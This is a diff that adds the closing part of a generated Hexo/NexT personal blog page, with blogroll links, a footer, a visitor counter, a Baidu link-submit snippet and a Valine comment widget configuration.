+          <a href="https://www.suk1.top/" title="https:&#x2F;&#x2F;www.suk1.top&#x2F;" rel="noopener" target="_blank">晓黑</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.dreams-wj.top/" title="https:&#x2F;&#x2F;blog.dreams-wj.top" rel="noopener" target="_blank">HKer_YM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ncsec.cn/" title="https:&#x2F;&#x2F;blog.ncsec.cn&#x2F;" rel="noopener" target="_blank">RoarNya</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChenZIDu</span>
+</div>
+  <div class="powered-by">Oinsm
+    
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Web – <a href="https://github.com/ChenZIDu" rel="noopener" target="_blank">🙂</a>
+    
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 'Kp900xxAQMLq3K0AkgqsPzcV-gzGzoHsz',
+    appKey: 'XdnaoJVs9feaETzUFPUq79tD',
+    placeholder: "Just go go",
+    avatar: 'robohash',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: true,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
